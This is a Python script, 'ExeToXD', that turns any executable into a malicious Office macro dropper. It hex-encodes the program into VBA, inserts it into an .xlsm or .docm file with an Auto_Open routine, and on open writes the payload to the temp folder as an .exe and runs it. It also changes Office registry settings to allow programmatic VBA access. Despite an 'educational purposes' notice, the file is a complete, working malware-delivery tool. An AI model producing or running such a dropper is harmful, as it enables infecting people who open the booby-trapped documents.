#!/bin/python
# -*- coding: utf-8 -*-
#
# Author: OzoNeTT
# Date: 23.01.2022
#
# Description: This script uses to injects an executable file to EXCEL document.
#
# NOTICE: Use it only for educational purposes, do not distribute or use it for a malicious payload delivery
# to another users. Just for self-practicing!
#
# Usage: python exe-to-xlsm.py -i input.exe --xlsm dropper.xlsm
#
# Result will be saved to "./out" directory
#

import math
import win32api
import win32con
import win32com.client
import argparse
import os
import time
import sys
import openpyxl
import binascii


sys.coinit_flags = 0

if not os.path.exists('out'):
    os.system('mkdir out')
OUT_DIR = os.path.abspath('./out')

HEXDECODE = """Public Function HexDecode(sData As String) As String
    Dim iChar As Integer
    Dim sOutString As String
    Dim sTmpChar As String
    For iChar = 1 To Len(sData) Step 2
        sTmpChar = Chr("&H" & Mid(sData, iChar, 2))
        sOutString = sOutString & sTmpChar
    Next iChar
    HexDecode = sOutString
End Function


Private Sub Auto_Open()

"""

parser = argparse.ArgumentParser(description="-= ExeToXD v0.2 =-")
parser.add_argument("--xlsm", dest="xlsm", const='', help="Insert VB script to xlsm", required=False, action="store_const")
parser.add_argument("--docm", dest="docm", const='', help="Insert VB script to docm", required=False, action="store_const")
parser.add_argument("-i", dest="input", help="Input file", required=True)


def process_macro(filename):
    text = open(filename, 'rb').read()
    macro = open(os.path.join(OUT_DIR, 'macros.txt'), 'w')

    macro.write(HEXDECODE)

    rowcount = math.ceil(len(text) / 500)
    macro.write("Dim codes(1 To " + str(rowcount) + ") As String\n")

    temp = ''
    for i in range(1, len(text)):
        temp += binascii.hexlify(text[(i - 1):i]).decode()
        if (i % 500) == 0:
            line = f'codes({math.ceil(i / 500)})="{temp}"\n'
            macro.write(line)
            temp = ''
    if temp != '':
        line = f'codes({rowcount})="{temp}00"\n'
        macro.write(line)

    macro.write(f'\ncode = ""\n')
    macro.write(f'For i = 1 To {str(rowcount)}\n')
    macro.write('    code = code + codes(i)\n')
    macro.write('Next\n\n')
    macro.write('fnum = FreeFile\n')
    macro.write('fname = Environ("TMP") & "\\dropped_from_excel.exe"\n')
    macro.write('Open fname For Binary As #fnum\n')
    macro.write(f'    For t = 1 To {str(rowcount * 1000)} Step 4\n')
    macro.write('        vv = Mid(code, t, 4)\n')
    macro.write('        Put #fnum, , HexDecode(CStr(vv))\n')
    macro.write('    Next t\n')
    macro.write('Close #fnum\n\n')
    macro.write('Dim rss\n')
    macro.write('rss = Shell(fname, 1)\n\n')
    macro.write('End Sub\n\n')

    macro.close()


def create_document(file, type):
    if type == "xlsm":
        wb = openpyxl.Workbook()
        ws = wb.active
        wb.save(file)
        wb = openpyxl.load_workbook(file, keep_vba=True)
        wb.save(file)
    elif type == "docm":
        com_instance = win32com.client.Dispatch("Word.Application")
        com_instance.Visible = False
        worddoc = com_instance.Documents.Add()
        worddoc.SaveAs(file, FileFormat=13)
        com_instance.Quit()


def add_regkey():
    key1 = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER,
                                "Software\\Microsoft\\Office\\16.0\\Excel"
                                + "\\Security", 0, win32con.KEY_ALL_ACCESS)
    key2 = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER,
                                "Software\\Microsoft\\Office\\16.0\\Word"
                                + "\\Security", 0, win32con.KEY_ALL_ACCESS)


    win32api.RegSetValueEx(key1, "AccessVBOM", 0, win32con.REG_DWORD, 1)
    win32api.RegSetValueEx(key2, "AccessVBOM", 0, win32con.REG_DWORD, 1)


def include_office(file, type, creation_flag):
    if creation_flag:
        document = ''
        print(f'{"Creating file...":32}', end='')
        if type == "xlsm":
            document = 'document.xlsm'
        elif type == "docm":
            document = 'document.docm'
        try:
            file = os.path.join(OUT_DIR, document)
            create_document(file, type)
        except Exception:
            print(f'[FAILED]')
            exit(1)
        print(f'[DONE]')
        time.sleep(1)

    print(f'{"Adding regkey...":32}', end='')
    try:
        add_regkey()
    except Exception:
        print(f'[FAILED]')
    print(f'[DONE]')

    with open(os.path.join(OUT_DIR, 'macros.txt'), 'r', encoding="latin-1") as macro_file:
        macro = macro_file.read()

    com_instance = None
    objworkbook = None
    xlmodule = None

    print(f'{"Initializing Office App...":32}', end='')
    try:
        if type == "xlsm":
            com_instance = win32com.client.Dispatch("Excel.Application")
        elif type == "docm":
            com_instance = win32com.client.Dispatch("Word.Application")

        com_instance.Visible = False
        time.sleep(10)
    except Exception:
        print(f'[FAILED]')
        com_instance.Quit()
        exit(1)
    print(f'[DONE]')

    print(f'{"Opening workbook...":32}', end='')
    try:
        if type == "xlsm":
            objworkbook = com_instance.Workbooks.Open(file)
        elif type == "docm":
            objworkbook = com_instance.Documents.Open(file)
            time.sleep(1)
    except Exception:
        print(f'[FAILED]')
        com_instance.Quit()
        exit(1)
    print(f'[DONE]')

    print(f'{"Creating VBProject...":32}', end='')
    try:
        xlmodule = objworkbook.VBProject.VBComponents.Add(1)
    except Exception:
        print(f'[FAILED]')
        com_instance.Quit()
        exit(1)
    print(f'[DONE]')

    print(f'{"Adding VBScript...":32}', end='')
    try:
        xlmodule.CodeModule.AddFromString(macro.strip())
        time.sleep(5)
    except Exception:
        print(f'[FAILED]')
        com_instance.Quit()
        exit(1)
    print(f'[DONE]')

    com_instance.DisplayAlerts = False
    print(f'{"Saving Dropper...":32}', end='')
    try:
        if type == 'xlsm':
            objworkbook.SaveAs(file, None, '', '')
        elif type == 'docm':
            objworkbook.SaveAs(file, FileFormat=13)
        time.sleep(1)
    except Exception:
        print(f'[FAILED]')
        com_instance.Quit()
        exit(1)
    print(f'[DONE]')

    com_instance.Quit()

def processing_xlsm(args, creation):
    print(f'Start EXE to XLSM...\n')

    print(f'Inserting VBA script to XLSM:')
    try:
        include_office(os.path.join(OUT_DIR, args.xlsm), "xlsm", creation)
    except Exception:
        print('\nError occurred while creating XLSM!')
        exit(1)
    print(f'\nXLSM successfully been created to out\\{args.xlsm}\n')


def processing_docm(args, creation):
    print(f'Start EXE to DOCM...\n')

    print(f'Inserting VBA script to DOCM:')
    try:
        include_office(os.path.join(OUT_DIR, args.docm), "docm", creation)
    except Exception:
        print('\nError occurred while creating DOCM!')
        exit(1)
    print(f'\nDOCM successfully been created to out\\{args.docm}\n')

def processing(args):
    print(f'-= ExeToXD v0.2 =-\n')

    if not args.xlsm and not args.docm:
        print('No office tags specified. Just creating macros')


    print(f'{"Creating VBA script...":32}', end='')
    try:
        process_macro(args.input)
    except Exception:
        print('Error occurred while creating VBA macros!')
        exit(1)

    print(f'[DONE]\n')

    if args.xlsm is not None and args.docm is None:
        creation = False
        if args.xlsm == '':
            print('No xlsm specified, file will be created (document.xlsm)')
            creation = True

        if args.xlsm.split('.')[-1] != 'xlsm' and not creation:
            args.xlsm += '.xlsm'

        processing_xlsm(args, creation)

    elif args.xlsm is None and args.docm is not None:
        creation = False
        if args.docm == '':
            print('No docm specified, file will be created (document.docm)')
            creation = True

        if args.docm.split('.')[-1] != 'docm' and not creation:
            args.docm += '.docm'

        processing_docm(args, creation)
    elif args.xlsm is not None and args.docm is not None:
        creation_xlsm = False
        creation_docm = False

        if args.xlsm == '':
            print('No xlsm specified, file will be created (document.xlsm)')
            creation_xlsm = True

        if args.xlsm.split('.')[-1] != 'xlsm' and not creation_xlsm:
            args.xlsm += '.xlsm'

        if args.docm == "docm":
            print('No docm specified, file will be created (document.docm)')
            creation_docm = True

        if not creation_docm and args.docm.split('.')[-1] != 'docm' :
            args.docm += '.docm'

        processing_xlsm(args, creation_xlsm)
        processing_docm(args, creation_docm)


    print(f'\n[FINISHED]\n')


if __name__ == '__main__':
    processing(parser.parse_args())
    exit(0)
